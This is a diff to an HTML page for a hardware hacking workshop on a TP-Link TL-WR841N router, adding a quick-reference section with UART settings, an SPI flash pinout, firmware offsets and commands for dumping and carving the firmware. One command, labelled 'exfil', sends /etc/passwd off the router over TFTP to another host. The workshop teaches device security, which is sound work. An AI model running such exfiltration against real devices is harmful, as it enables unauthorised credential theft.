@@ -6,12 +6,12 @@
 <title>Hardware Hacking Workshop · Warpnet_</title>
 <meta name="description" content="A hands-on hardware hacking workshop by Warpnet on the TP-Link TL-WR841N v14.20 router: recon and OSINT, a UART root shell, and SPI flash firmware extraction.">
 
-<!-- Social / SEO. Update the canonical/OG URL to wherever you host this. -->
-<link rel="canonical" href="https://example.github.io/">
+<!-- Social / SEO. -->
+<link rel="canonical" href="https://warpnet.github.io/hack-the-router/">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Hardware Hacking Workshop · Warpnet">
 <meta property="og:description" content="Crack the case, find the pads, dump the flash. A hands-on TP-Link TL-WR841N v14.20 workshop by Warpnet: OSINT, a UART root shell, and SPI firmware extraction.">
-<meta property="og:url" content="https://example.github.io/">
+<meta property="og:url" content="https://warpnet.github.io/hack-the-router/">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hardware Hacking Workshop · Warpnet">
 <meta name="twitter:description" content="Crack the case, find the pads, dump the flash. OSINT → UART root shell → SPI firmware extraction on a TP-Link TL-WR841N v14.20.">
@@ -54,6 +54,7 @@
       <li><a href="#section-3">Section 3 · SPI dump &amp; firmware</a></li>
       <li><a href="#recap">Recap</a></li>
       <li><a href="#score-section">Your score</a></li>
+      <li><a href="#quick-reference">Quick reference</a></li>
       <li><a href="#troubleshooting">Troubleshooting</a></li>
       <li><a href="#going-deeper">Going deeper</a></li>
       <li><a href="#brag">Brag about it</a></li>
@@ -552,6 +553,61 @@ PY</pre>
 
   <!-- Confetti container, populated by JS on completion -->
   <div class="confetti" id="confetti" aria-hidden="true"></div>
+
+  <!-- QUICK REFERENCE -->
+  <h2 id="quick-reference">Quick reference</h2>
+
+  <h3>UART</h3>
+  <table class="ref">
+    <tbody>
+      <tr><td>Baud</td><td><b>115200</b></td></tr>
+      <tr><td>Framing</td><td><b>8N1</b></td></tr>
+      <tr><td>Logic level</td><td><b>3.3V TTL</b></td></tr>
+      <tr><td>Wiring</td><td>adapter RX ← board TX · adapter TX → board RX · GND↔GND · VCC not connected</td></tr>
+    </tbody>
+  </table>
+
+  <h3>SPI flash (SOIC-8, 3.3V)</h3>
+  <pre>      ┌──────┐
+ <span class="k">CS</span> ──┤1•   8├── <span class="k">VCC</span> (3V3)   <span class="c"># pin 1 = the dot</span>
+ <span class="k">DO</span> ──┤2    7├── <span class="k">HOLD</span>
+ <span class="k">WP</span> ──┤3    6├── <span class="k">CLK</span>
+<span class="k">GND</span> ──┤4    5├── <span class="k">DI</span>
+      └──────┘
+<span class="c"># read with: flashrom -p ch341a_spi -c "EN25QH32B"</span></pre>
+
+  <h3>Firmware offsets (v14.20)</h3>
+  <table class="ref">
+    <tbody>
+      <tr><td>Format</td><td>raw <b>LZMA_ALONE</b> (.lzma), properties byte <code class="inline">0x6E</code></td></tr>
+      <tr><td>Main firmware</td><td><code class="inline">0x25080</code> (~4 MB, kernel + userland)</td></tr>
+      <tr><td>Web UI block</td><td><code class="inline">0x164BE4</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>Commands</h3>
+  <pre><span class="c"># serial console</span>
+<span class="k">picocom</span> -b 115200 /dev/ttyUSB0
+<span class="c"># network recon</span>
+<span class="k">nmap</span> -p- -sV 192.168.0.1
+<span class="c"># dump the flash and verify</span>
+<span class="k">flashrom</span> -p ch341a_spi -c <span class="p">"EN25QH32B"</span> -r dump.bin
+<span class="k">sha256sum</span> dump.bin
+<span class="c"># carve the image</span>
+<span class="k">binwalk</span> -e dump.bin
+<span class="c"># exfil a file from the shell over TFTP</span>
+<span class="k">tftp</span> -p -l /etc/passwd 192.168.0.100</pre>
+
+  <h3>Handy facts</h3>
+  <table class="ref">
+    <tbody>
+      <tr><td>SoC</td><td><b>MediaTek MT7628</b></td></tr>
+      <tr><td>Flash</td><td><b>EN25QH32B</b> (4 MB / 32 Mbit)</td></tr>
+      <tr><td>Admin UI</td><td>tplinkwifi.net · 192.168.0.1</td></tr>
+      <tr><td>Bootloader</td><td>U-Boot (<code class="inline">MT7628 #</code>)</td></tr>
+      <tr><td>FCC grantee code</td><td>2AXJ4</td></tr>
+    </tbody>
+  </table>
 
   <!-- TROUBLESHOOTING -->
   <h2 id="troubleshooting">Troubleshooting</h2>
